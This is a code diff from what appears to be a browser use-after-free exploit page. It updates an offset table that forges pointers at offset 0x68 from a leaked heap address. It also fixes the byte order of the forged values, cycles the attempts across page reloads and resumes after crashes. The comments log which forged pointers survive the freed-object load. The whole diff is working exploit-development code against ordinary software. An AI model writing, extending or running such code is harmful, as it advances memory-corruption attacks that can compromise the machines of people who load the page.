@@ -20,16 +20,12 @@
     [this prime] -> [arm delta k] -> [this prime] -> [arm delta k+1] ...
 
 
-    #0  delta 0      (p685 arm-9 repeat — known survivor, sanity)
-    #1  delta +8     (impl view starts at m_ptr cell)
-    #2  delta +0x10  (thread-flag cell as refcount)
-    #3  delta +0x18  (past impl — whatever follows)
-    #4  delta +0x20
-    #5  delta +0x28
-    #6  delta -8     (refcount view starts in bytes before impl)
-    #7  delta -0x10
-    #8  delta -0x18
-    #9  delta -0x20
+  #0-#12   near set: 0, +-8, +-0x10, +-0x18, +-0x20, +-0x28, +-0x40
+  #13-#24  wide set: +-0x80, +-0x100, +-0x400, +-0x1000, +-0x4000, +-0x10000
+  #25      'T' — +0x68 = priorT (different pointer shape, different zone)
+
+  See also the v4 fix notes in the getter: forges are little-endian; the
+  pre-fix runs were byte-reversed and their content rows are re-measurements.
 
   Same discipline as p685: blind forge into all 16 buffers BEFORE the
   check() walk; NO beacon inside the poisoned then-getter; auto-cycle via
@@ -84,8 +80,19 @@ if(priorT)emit('PRIOR-T',priorT);else emit('PRIOR-T','none');
 if(priorI)emit('PRIOR-I',priorI);else emit('PRIOR-I','none');
 flush();
 
-var DELTAS=[0,8,0x10,0x18,0x20,0x28,-8,-0x10,-0x18,-0x20];
-var delta=DELTAS[arm];if(delta===undefined)delta=0;
+// Arm table v4. Near set replicates the v2/v3 bisect; the wide set probes
+// how far from the impl the walk still tolerates a followed pointer
+// (ThreadHeap neighbours are dense: small +-deltas often land in live
+// objects). 'T' forges priorT at +0x68 — a pointer of a different SHAPE
+// and different zone than impl; with the byte-order fix this is the clean
+// shape discriminator (its pre-fix counterpart died as byte-reversed
+// garbage, so that row needs re-measurement too).
+// ALL forges are written little-endian (LSB first) — see the getter below.
+var ARMS=[0,8,-8,0x10,-0x10,0x18,-0x18,0x20,-0x20,0x28,-0x28,0x40,-0x40,
+          0x80,-0x80,0x100,-0x100,0x400,-0x400,0x1000,-0x1000,
+          0x4000,-0x4000,0x10000,-0x10000,'T'];
+function dlabel(a){var x=ARMS[a];return x==='T'?'T':((x>=0?'+':'-')+'0x'+Math.abs(x).toString(16));}
+var delta=ARMS[arm];if(typeof delta!=='number'&&delta!=='T')arm=0,delta=ARMS[0];
 // phase machine PRIME <-> ARM, strictly alternating. p686 10:12 run proved
 // the 2nd consecutive UAF load of a process dies regardless of forge
 // content (9/9, even delta=0 exact impl), while arm#1-class loads survive
@@ -101,18 +108,23 @@ var forgeVal='';
 // short-circuits this via diedSince anyway.
 try{localStorage.setItem('p686phase', primeMode?'arm':'prime');}catch(e){}
 if(primeMode){
-  emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+DELTAS[arm!==undefined&&DELTAS[arm]!==undefined?arm:0]);flush();
+  emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+dlabel(arm));flush();
 }else{
-  // forge value: priorImpl + delta padded to full 16 hex chars
-  var v=parseInt(priorI,16)+delta;
-  if(v<0)v+=0x10000000000;
-  forgeVal=('0000000000000000'+v.toString(16)).slice(-16);
-  emit('ARM','off=0x68 delta='+delta+' val=0x'+forgeVal);
-  var nxt=arm>=DELTAS.length-1?0:arm+1;
+  if(delta==='T'){
+    forgeVal=priorT;
+    emit('ARM','off=0x68 src=T delta=0 val=0x'+forgeVal);
+  }else{
+    // forge value: priorImpl + delta padded to full 16 hex chars
+    var v=parseInt(priorI,16)+delta;
+    if(v<0)v+=0x10000000000;
+    forgeVal=('0000000000000000'+v.toString(16)).slice(-16);
+    emit('ARM','off=0x68 delta='+delta+' val=0x'+forgeVal);
+  }
+  var nxt=arm>=ARMS.length-1?0:arm+1;
   // advance the arm ONLY on arm-mode loads; an arm death still counts as
   // its observation and the post-death re-prime resumes at deadArm+1
   try{localStorage.setItem('p686arm',String(nxt));}catch(e){}
-  emit('SEQ','next arm = '+nxt+' delta='+DELTAS[nxt]);
+  emit('SEQ','next arm = '+nxt+' delta='+dlabel(nxt));
 }
 flush();
 
@@ -186,7 +198,7 @@ setTimeout(function(){
         localStorage.removeItem('p685T');localStorage.removeItem('p685I');
         // resume the census at the arm AFTER the one that died (wrap at 9)
         if(deadArm!==null){
-          var resume=deadArm>=DELTAS.length-1?0:deadArm+1;
+          var resume=deadArm>=ARMS.length-1?0:deadArm+1;
           localStorage.setItem('p686arm',String(resume));
           emit('SEQ','resume plan: next load = arm '+resume);
         }
@@ -195,7 +207,7 @@ setTimeout(function(){
     }
   }
   document.body.offsetHeight;
-  emit('ALIVE','survived delta='+delta+' val=0x'+forgeVal);
+  emit('ALIVE','survived mode='+(primeMode?'prime':'arm')+' arm='+arm+' delta='+dlabel(arm)+' val=0x'+forgeVal);
   flush();
   emit('DONE','arm='+arm);
   flush();
